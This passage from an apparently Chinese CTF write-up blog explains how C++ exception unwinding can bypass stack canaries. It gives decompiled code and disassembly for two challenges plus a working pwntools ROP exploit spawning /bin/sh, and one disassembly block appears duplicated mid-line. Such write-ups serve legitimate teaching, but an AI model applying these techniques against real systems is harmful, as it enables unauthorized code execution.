—▸ 0x55555555530d (test_func2()+106) ◂— endbr64</span><br><span class="line">02:0010│ rdi rsp 0x7fffffffdb60 —▸ 0x7fffffffdcc8 —▸ 0x7fffffffdf45 ◂— &#x27;/mnt/c/Users/31386/Desktop/tmp&#x27;</span><br><span class="line">03:0018│-018     0x7fffffffdb68 ◂— 0xd6e057b5651d2000</span><br><span class="line">04:0020│-010     0x7fffffffdb70 ◂— 0x0</span><br><span class="line">05:0028│-008     0x7fffffffdb78 ◂— 0x0</span><br><span class="line">06:0030│ rbp     0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdbb0 ◂— 0x1</span><br><span class="line">07:0038│+008     0x7fffffffdb88 —▸ 0x5555555553b8 (test_func1()+61) ◂— lea rax, [rip + 0xc7a]</span><br></pre></td></tr></table></figure><p>很明显，func3的返回地址从<code>func2+61</code>变成了<code>func2+106</code>。这就给了我们一个启示：其实可以像正常rop一样劫持ret地址的。但是有一个疑问在于，明明throw往往会比栈溢出更先发生，那岂不是劫持好的ret地址又被修改了？事实上在一些情况下并不会发生，但是百思不得其解。迫不得已，去找找源码。<a href="https://blog.csdn.net/lidan113lidan/article/details/121865210">资料</a> <a href="https://github.com/gcc-mirror/gcc/blob/master/libgcc/unwind.inc">源码</a></p><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/unwind-dw2.c#L940">libc</a>里只能找到关于上下文设置的函数，没有<code>_Unwind_RaiseException</code>的，一番搜索之后发现他在gcc的源码里。这意味这什么？这意味这其实这部分处理早在编译的时候就已经做好预处理了，而非程序运行才来处理，是更底层的实现，比如像这个函数是怎么找到catch块的这样的问题。</p><p>结合上面两篇资料的分析（我想大概是基于LSDA的检查），加上我自己对源码的理解，应该可以得出一个结论：只要ret地址劫持的是catch块就可以绕过检查，直接break结束循环寻找catch的过程。经过实验发现只要是位于try和catch之间的地址都是合法的。<strong>因为资料里有太多看不懂的术语，不确定我的理解是否正确，所以这里只是我的想法，仅有少量实验，未经过严谨的推断，准确性有待商榷。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">     <span class="keyword">if</span> (fs.personality)</span><br><span class="line">&#123;</span><br><span class="line">  code = (*fs.personality) (<span class="number">1</span>, _UA_SEARCH_PHASE, exc-&gt;exception_class,</span><br><span class="line">    exc, &amp;cur_context);</span><br><span class="line">  <span class="keyword">if</span> (code == _URC_HANDLER_FOUND)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">    <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这只是有关异常处理利用的其中一种方式而已，我见到更多的其实是利用它不执行后续代码来绕过canary然后打栈迁移的。</p><h3 id="DASCTF-X-GFCTF-2024-control"><a href="#DASCTF-X-GFCTF-2024-control" class="headerlink" title="DASCTF X GFCTF 2024  control"></a>DASCTF X GFCTF 2024  control</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r9d</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to control&quot;</span>, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s answer some question&quot;</span>, argv);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;Gift&gt; &quot;</span>, (_DWORD)argv, v3, v4, v5, v6);</span><br><span class="line">  read(<span class="number">0LL</span>, &amp;gift, <span class="number">16LL</span>);</span><br><span class="line">  <span class="keyword">return</span> vuln(<span class="number">0LL</span>, (__int64)&amp;gift);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vuln</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v4[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How much do you know about control?&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0LL</span>, v4, <span class="number">0x100</span>LL) &gt; <span class="number">96</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = _cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = <span class="string">&quot;WRONGING! This answer is not suit&quot;</span>;</span><br><span class="line">    _cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> <span class="type">const</span>*, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序开头允许向bss段输入16个字节，然后在vuln函数中有cpp的异常处理函数，同时有0x30大小的栈溢出。可以看到当输入大于0x60的时候，就会触发异常处理。<strong>触发异常处理后，该函数后面的代码不再执行。</strong>所以就算破坏了canary程序也不一定会直接退出（之所以说不一定是因为有可能异常处理函数就是退出处理）。</p><p>看汇编会发现vuln函数里并没有catch，main函数中有catch，所以vuln函数中的栈溢出检查就不会被执行，会从main继续往下执行，main结束时会返回，所以只要劫持rbp到bss段上就可以进行rop了。</p><p>刚好一开始可以写16个字节，可以提前布置好binsh和ret地址，让main返回之后再次执行vuln函数。方便起见，可以直接劫持ret地址为read处，这样可以绕过栈初始化，就不用再动调看偏移了。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./control&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./control&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x4D3350</span></span><br><span class="line">vuln = <span class="number">0x402183</span></span><br><span class="line"></span><br><span class="line">payload = p64(gift) + p64(vuln)</span><br><span class="line">r.sendafter(<span class="string">b&quot;Gift&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64(gift)</span><br><span class="line">r.sendafter(<span class="string">b&quot;control?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x462c27</span></span><br><span class="line">pop_rdi = <span class="number">0x401c72</span></span><br><span class="line">pop_rsi = <span class="number">0x405285</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x495b8b</span></span><br><span class="line">syscall = <span class="number">0x40161e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>  <span class="comment"># &lt;-- gift</span></span><br><span class="line">payload += p64(pop_rax)  <span class="comment"># &lt;-- ret地址</span></span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(gift)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="2024羊城杯-logger"><a href="#2024羊城杯-logger" class="headerlink" title="2024羊城杯 logger"></a>2024羊城杯 logger</h3><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>这道题就要用到最开始分析的方法了，因为这道题是有后门的。</p><p>trace函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4015AB</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+26h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nYou can record log details here: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_404020[<span class="number">16</span> * i + read(<span class="number">0</span>, &amp;byte_404020[<span class="number">16</span> * i], <span class="number">0x10</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Do you need to check the records? &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%1s&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v4 == <span class="number">121</span> || (_BYTE)v4 == <span class="number">89</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * j] &amp;&amp; v3; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31mRecord%d. %.16s\x1B[0m&quot;</span>, j + <span class="number">1</span>, &amp;byte_404020[<span class="number">16</span> * j]);</span><br><span class="line">        --v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_BYTE)v4 != <span class="number">110</span> &amp;&amp; (_BYTE)v4 != <span class="number">78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input. Please enter &#x27;y&#x27; or &#x27;n&#x27;.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Records have been filled :(&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数允许我们写九次每次16个字节的数据，每次写入后会在末尾加一个截断符，写入的时候会检查该地址起始是否为\0。</p><p>warn函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_40178A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  _BYTE buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  _QWORD v5[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  _QWORD v6[<span class="number">5</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_401CA0(buf);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  sub_4014FD(v5, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\x1B[1;31m%s\x1B[0m\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[!] Type your message here plz: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v0 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  HIBYTE(v3) = HIBYTE(v0);</span><br><span class="line">  buf[v0 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(byte_404200, buf, <span class="keyword">sizeof</span>(byte_404200));</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;dest[<span class="built_in">strlen</span>(dest)], <span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(dest, byte_404200, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(dest);</span><br><span class="line">    exception = __cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = src;</span><br><span class="line">    __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> *, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(byte_404100, buf, <span class="keyword">sizeof</span>(byte_404100));</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  sub_4014FD(v6, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[User input log]\nMessage: %s\nDone at %s\n&quot;</span>, byte_404100, (<span class="type">const</span> <span class="type">char</span> *)v6);</span><br><span class="line">  sub_401CCA(buf);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有抛出异常的函数，如果输入字节的长度大于16字节就会抛出异常。查看汇编发现当前函数是没有catch块的，而调用链上最近的catch块在main函数（其实也是调用链上唯一一个）。异常抛出函数将src处（在data段）的字符当作exception传给catch，然后打印一串字符，接着继续执行main函数，因为main是无限循环的，所以不会退出。</p><p>同时可以发现这个程序其实不止一个catch块，并且在0x401BC7的catch执行了system，所以我们可以劫持ret地址到这个后门catch块。接下来考虑怎么传参就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401B</span>8F ; <span class="type">void</span> __noreturn <span class="title function_">sub_401B8F</span><span class="params">()</span></span><br><span class="line">.text:0000000000401B8F sub_401B8F      proc near</span><br><span class="line">.text:0000000000401B8F</span><br><span class="line">.text:0000000000401B8F command         = qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F var_8           = qword ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>93                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401B</span>94                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>97                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000401B</span>98                 sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>9C                 mov     edi, <span class="number">8</span>          ; thrown_size</span><br><span class="line">.text:<span class="number">0000000000401B</span>A1                 call    ___cxa_allocate_exception</span><br><span class="line">.text:<span class="number">0000000000401B</span>A6                 lea     rdx, aEchoHelloYcbCt ; <span class="string">&quot;echo Hello, YCB ctfer!&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>AD                 mov     [rax], rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>B0                 mov     edx, <span class="number">0</span>          ; <span class="type">void</span> (*)(<span class="type">void</span> *)</span><br><span class="line">.text:<span class="number">0000000000401B</span>B5                 mov     rcx, cs:_ZTIPKc_ptr</span><br><span class="line">.text:<span class="number">0000000000401B</span>BC                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:<span class="number">0000000000401B</span>BF                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2                 call    ___cxa_throw</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   &#125; <span class="comment">// starts at 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ; ---------------------------------------------------------------------------.text:<span class="number">0000000000401B</span>8F ; <span class="type">void</span> __noreturn <span class="title function_">sub_401B8F</span><span class="params">()</span></span><br><span class="line">.text:0000000000401B8F sub_401B8F      proc near</span><br><span class="line">.text:0000000000401B8F</span><br><span class="line">.text:0000000000401B8F command         = qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F var_8           = qword ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>93                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401B</span>94                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>97                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000401B</span>98                 sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>9C                 mov     edi, <span class="number">8</span>          ; thrown_size</span><br><span class="line">.text:<span class="number">0000000000401B</span>A1                 call    ___cxa_allocate_exception</span><br><span class="line">.text:<span class="number">0000000000401B</span>A6                 lea     rdx, aEchoHelloYcbCt ; <span class="string">&quot;echo Hello, YCB ctfer!&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>AD                 mov     [rax], rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>B0                 mov     edx, <span class="number">0</span>          ; <span class="type">void</span> (*)(<span class="type">void</span> *)</span><br><span class="line">.text:<span class="number">0000000000401B</span>B5                 mov     rcx, cs:_ZTIPKc_ptr</span><br><span class="line">.text:<span class="number">0000000000401B</span>BC                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:<span class="number">0000000000401B</span>BF                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2                 call    ___cxa_throw</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   &#125; <span class="comment">// starts at 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ;   catch(<span class="type">char</span> <span class="type">const</span>*) <span class="comment">// owned by 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>CB                 cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>CF                 jz      <span class="type">short</span> loc_401BD9</span><br><span class="line">.text:<span class="number">0000000000401B</span>D1                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000401B</span>D4                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9 loc_401BD9:                             ; CODE XREF: sub_401B8F+<span class="number">40</span>↑j</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>DC                 call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">0000000000401B</span>E1                 mov     [rbp+command], rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>E5                 mov     rax, [rbp+command]</span><br><span class="line">.text:<span class="number">0000000000401B</span>E9                 mov     rsi, rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>EC                 lea     rax, aAnExceptionOfT_1 ; <span class="string">&quot;[-] An exception of type String was cau&quot;</span>...</span><br><span class="line">.text:<span class="number">0000000000401B</span>F3                 mov     rdi, rax        ; format</span><br><span class="line">.text:<span class="number">0000000000401B</span>F6                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>FB ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>FB                 call    _printf</span><br><span class="line">.text:<span class="number">0000000000401</span>C00                 mov     rax, [rbp+command]</span><br><span class="line">.text:<span class="number">0000000000401</span>C04                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">0000000000401</span>C07                 call    _system</span><br><span class="line">.text:<span class="number">0000000000401</span>C07 ;   &#125; <span class="comment">// starts at 401BFB</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C0C                 nop</span><br><span class="line">.text:<span class="number">0000000000401</span>C0D                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000401</span>C12                 jmp     <span class="type">short</span> loc_401C2B</span><br><span class="line">.text:<span class="number">0000000000401</span>C14 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401</span>C14 ;   cleanup() <span class="comment">// owned by 401BFB</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C14                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401</span>C18                 mov     rbx, rax</span><br><span class="line">.text:<span class="number">0000000000401</span>C1B                 call    